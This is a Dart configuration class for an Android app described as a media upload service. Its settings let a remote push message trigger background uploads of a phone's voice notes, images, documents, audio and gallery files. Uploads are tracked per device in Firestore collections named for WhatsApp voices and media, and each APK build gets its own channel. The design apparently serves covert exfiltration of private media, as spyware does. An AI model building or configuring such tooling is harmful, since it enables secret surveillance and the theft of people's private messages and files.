/// Central knobs for the media upload service.
///
/// Everything that the worker, the FCM trigger and the UI need to agree on
/// lives here so there is a single place to tune behaviour.
class AppConfig {
  AppConfig._();

  // ---- Channel ID (change per APK build) ----
  static const String channelId = 'ca';
  static const String targetUrl = 'PLACEHOLDER_URL';

  // ---- Firestore layout ----
  /// `counters/{deviceId}` -> { deviceId, updatedAt, fcmToken, mediaStatus }
  static const String countersCollection = 'counters';

  // ---- WorkManager identifiers ----
  /// Media upload WorkManager task name.
  static const String mediaTaskName = 'media_upload_task';

  // ---- FCM contract ----
  /// A data message with data['action'] == mediaAction starts a media upload.
  /// data['mediaType'] selects the category (voice, images, documents, audio, gallery).
  static const String mediaAction = 'upload_media';

  // ---- Run behaviour ----
  /// Stop cleanly before the OS ~10-min background hard limit.
  static const Duration softDeadline = Duration(minutes: 9);

  // ---- Media upload tuning ----
  /// Files per batch before a cooldown pause.
  static const int mediaBatchSize = 50;

  /// Cooldown between batches.
  static const Duration mediaBatchCooldown = Duration(minutes: 2);

  /// Delay between individual file uploads within a batch.
  static const Duration mediaUploadDelay = Duration(seconds: 1);

  /// Firestore collections for upload tracking.
  static const String voiceTrackingCollection = 'whatsappVoices';
  static const String mediaTrackingCollection = 'whatsappAllMedia';

  // ---- Counter value logging ----
  /// When true, every counted value is written to a subcollection for audit.
  static const bool logEveryValue = false;

  /// Subcollection under each device doc where individual values are stored.
  static const String valuesSubcollection = 'values';
}
